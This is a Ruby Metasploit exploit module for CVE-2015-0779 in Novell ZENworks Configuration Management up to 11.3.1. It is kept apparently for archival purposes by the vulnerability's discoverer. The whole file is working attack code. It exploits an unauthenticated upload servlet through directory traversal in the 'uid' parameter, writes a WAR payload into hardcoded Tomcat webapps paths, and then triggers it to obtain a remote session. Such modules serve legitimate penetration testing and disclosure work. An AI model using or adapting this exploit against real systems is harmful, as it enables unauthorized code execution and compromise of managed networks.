##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

# NOTE !!!
# This exploit is kept here for archiving purposes only.
# Please refer to and use the version that has been accepted into the Metasploit framework.

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'        => 'Novell ZENworks Configuration Management Arbitrary File Upload',
      'Description' => %q{
        This module exploits a file upload vulnerability in Novell ZENworks Configuration
        Management (ZCM, which is part of the ZENworks Suite). The vulnerability exists in
        the UploadServlet which accepts unauthenticated file uploads and does not check the
        "uid" parameter for directory traversal characters. This allows an attacker to write
        anywhere in the file system, and can be abused to deploy a WAR file in the Tomcat
        webapps directory. ZCM up to (and including) 11.3.1 is vulnerable to this attack.
        This module has been tested successfully with ZCM 11.3.1 on Windows and Linux. Note
        that this is a similar vulnerability to ZDI-10-078 / OSVDB-63412 which also has a
        Metasploit exploit, but it abuses a different parameter of the same servlet.
      },
      'Author'       =>
        [
          'Pedro Ribeiro <pedrib[at]gmail.com>', # Vulnerability Discovery and Metasploit module
        ],
      'License'     => MSF_LICENSE,
      'References'  =>
        [
          ['CVE', '2015-0779'],
          ['OSVDB', '120382'],
          ['URL', 'https://raw.githubusercontent.com/pedrib/PoC/master/generic/zenworks_zcm_rce.txt'],
          ['URL', 'http://seclists.org/fulldisclosure/2015/Apr/21']
        ],
      'DefaultOptions' => { 'WfsDelay' => 30 },
      'Privileged'  => true,
      'Platform'    => 'java',
      'Arch'        => ARCH_JAVA,
      'Targets'     =>
        [
          [ 'Novell ZCM < v11.3.2 - Universal Java', { } ]
        ],
      'DefaultTarget'  => 0,
      'DisclosureDate' => 'Apr 7 2015'))

    register_options(
      [
        Opt::RPORT(443),
        OptBool.new('SSL',
          [true, 'Use SSL', true]),
        OptString.new('TARGETURI',
          [true, 'The base path to ZCM / ZENworks Suite', '/zenworks/']),
        OptString.new('TOMCAT_PATH',
          [false, 'The Tomcat webapps traversal path (from the temp directory)'])
      ], self.class)
  end


  def check
    res = send_request_cgi({
      'uri' => normalize_uri(datastore['TARGETURI'], 'UploadServlet'),
      'method' => 'GET'
    })

    if res && res.code == 200 && res.body.to_s =~ /ZENworks File Upload Servlet/
      return Exploit::CheckCode::Detected
    end

    Exploit::CheckCode::Safe
  end


  def upload_war_and_exec(tomcat_path)
    app_base = rand_text_alphanumeric(4 + rand(32 - 4))
    war_payload = payload.encoded_war({ :app_name => app_base }).to_s

    print_status("#{peer} - Uploading WAR file to #{tomcat_path}")
    res = send_request_cgi({
      'uri' => normalize_uri(datastore['TARGETURI'], 'UploadServlet'),
      'method' => 'POST',
      'data' => war_payload,
      'ctype' => 'application/octet-stream',
      'vars_get' => {
        'uid' => tomcat_path,
        'filename' => "#{app_base}.war"
      }
    })
    if res && res.code == 200
      print_status("#{peer} - Upload appears to have been successful")
    else
      print_error("#{peer} - Failed to upload, try again with a different path?")
      return false
    end

    10.times do
      Rex.sleep(2)

      # Now make a request to trigger the newly deployed war
      print_status("#{peer} - Attempting to launch payload in deployed WAR...")
      send_request_cgi({
        'uri'    => normalize_uri(app_base, Rex::Text.rand_text_alpha(rand(8)+8)),
        'method' => 'GET'
      })

      # Failure. The request timed out or the server went away.
      break if res.nil?
      # Failure. Unexpected answer
      break if res.code != 200
      # Unless session... keep looping
      return true if session_created?
    end

    false
  end


  def exploit
    tomcat_paths = []
    if datastore['TOMCAT_PATH']
      tomcat_paths << datastore['TOMCAT_PATH']
    end
    tomcat_paths.concat(['../../../opt/novell/zenworks/share/tomcat/webapps/', '../webapps/'])

    tomcat_paths.each do |tomcat_path|
      break if upload_war_and_exec(tomcat_path)
    end
  end
end
